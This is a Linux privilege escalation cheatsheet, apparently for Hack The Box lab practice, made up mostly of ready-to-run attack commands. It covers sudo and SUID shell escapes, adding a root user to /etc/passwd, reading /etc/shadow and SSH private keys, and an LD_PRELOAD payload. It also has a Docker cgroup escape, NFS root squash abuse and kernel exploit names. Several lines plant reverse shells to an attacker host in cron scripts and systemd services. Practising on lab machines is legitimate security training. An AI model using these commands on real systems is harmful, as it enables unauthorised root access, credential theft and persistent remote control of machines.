# Linux Privilege Escalation Cheatsheet

Common privesc vectors encountered in HTB machines.

## Quick Wins

```bash
# 1. Sudo misconfiguration
sudo -l
# Check GTFOBins for any allowed binary

# 2. SUID binaries
find / -perm -4000 -type f 2>/dev/null
# Check GTFOBins for any unusual SUID binary

# 3. Writable /etc/passwd
ls -la /etc/passwd
# If writable, add a root user:
echo 'hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash' >> /etc/passwd

# 4. Readable /etc/shadow
ls -la /etc/shadow
# Copy hashes, crack with hashcat/john

# 5. SSH keys
cat /root/.ssh/id_rsa
cat /home/*/.ssh/id_rsa
find / -name "id_rsa" 2>/dev/null
```

## Sudo Abuse

```bash
# List sudo permissions
sudo -l

# Common GTFOBins exploits
sudo vim -c '!sh'
sudo find / -exec /bin/sh \;
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo less /etc/shadow  # then !sh
sudo man man  # then !sh
sudo env /bin/sh
sudo nmap --interactive  # nmap < 5.0
sudo perl -e 'exec "/bin/sh";'
sudo ruby -e 'exec "/bin/sh"'

# LD_PRELOAD
# If: env_keep+=LD_PRELOAD
# Compile: gcc -fPIC -shared -nostartfiles -o /tmp/pe.so pe.c
# pe.c:
# #include <stdio.h>
# #include <stdlib.h>
# void _init() { unsetenv("LD_PRELOAD"); setuid(0); system("/bin/bash -p"); }
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>

# LD_LIBRARY_PATH
# If: env_keep+=LD_LIBRARY_PATH
# Find shared libraries: ldd /usr/bin/program
# Create malicious .so replacing one of them
```

## SUID/SGID Exploitation

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Common SUID exploits (check GTFOBins)
# Custom SUID binary - check for:
# - Relative path calls (PATH hijacking)
# - Shared library injection
# - Command injection through arguments

# PATH hijacking
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
./vulnerable-suid-binary

# Shared library injection
# Use strace to find missing .so files
strace ./suid-binary 2>&1 | grep "No such file"
# Create malicious .so in writable location
```

## Capabilities

```bash
# Find binaries with capabilities
getcap -r / 2>/dev/null

# Common capability exploits
# cap_setuid - python3
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# cap_dac_read_search - tar
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz

# cap_net_raw - tcpdump/python
# Sniff network traffic for credentials
```

## Cron Jobs

```bash
# Check cron
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
ls -la /var/spool/cron/crontabs/

# Monitor with pspy
./pspy64

# Writable cron script
echo 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1' >> /path/to/cron-script.sh

# Wildcard injection (if cron runs: tar czf /tmp/backup.tar.gz *)
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint=1"
echo 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1' > shell.sh
```

## Kernel Exploits

```bash
# Check kernel version
uname -r
cat /proc/version

# Search for exploits
searchsploit linux kernel <version>
# Or use linux-exploit-suggester

# Notable kernel exploits:
# DirtyPipe (CVE-2022-0847) - Linux 5.8+
# DirtyCow (CVE-2016-5195) - Linux 2.6.22 - 4.8.3
# PwnKit (CVE-2021-4034) - polkit pkexec
# Baron Samedit (CVE-2021-3156) - sudo < 1.9.5p2
# GameOver(lay) (CVE-2023-2640, CVE-2023-32629) - Ubuntu OverlayFS
```

## Docker Escape

```bash
# Check if in Docker
ls -la /.dockerenv
cat /proc/1/cgroup | grep docker

# Docker socket available
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Privileged container
mount /dev/sda1 /mnt
chroot /mnt

# Cap_sys_admin
mount -t cgroup -o rdma cgroup /tmp/cgroup
echo 1 > /tmp/cgroup/x/notify_on_release
echo "#!/bin/sh" > /cmd
echo "cat /etc/shadow > /tmp/cgroup/output" >> /cmd
chmod +x /cmd
echo "/cmd" > /tmp/cgroup/release_agent
sh -c "echo $$ > /tmp/cgroup/x/cgroup.procs"
```

## NFS Misconfiguration

```bash
# Check NFS exports
showmount -e 10.10.10.X
cat /etc/exports  # Look for no_root_squash

# Mount and exploit no_root_squash
mount -t nfs 10.10.10.X:/share /mnt
# As root on attacker:
cp /bin/bash /mnt/bash
chmod +s /mnt/bash
# On target:
/share/bash -p
```

## Writable Services/Timers

```bash
# Writable systemd service
find / -writable -name "*.service" 2>/dev/null

# Modify service to execute payload
[Service]
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.X/4444 0>&1'

# Writable systemd timer
find / -writable -name "*.timer" 2>/dev/null
```

## Miscellaneous

```bash
# Internal services on localhost
ss -tulnp | grep 127.0.0.1
# Port forward to access: ssh -L 8080:127.0.0.1:8080 user@10.10.10.X

# Password reuse - try found passwords as root
su - root

# MySQL running as root
mysql -u root -p
\! bash

# Screen sessions
screen -ls
screen -r <session>

# tmux sessions
tmux ls
tmux attach -t <session>
```
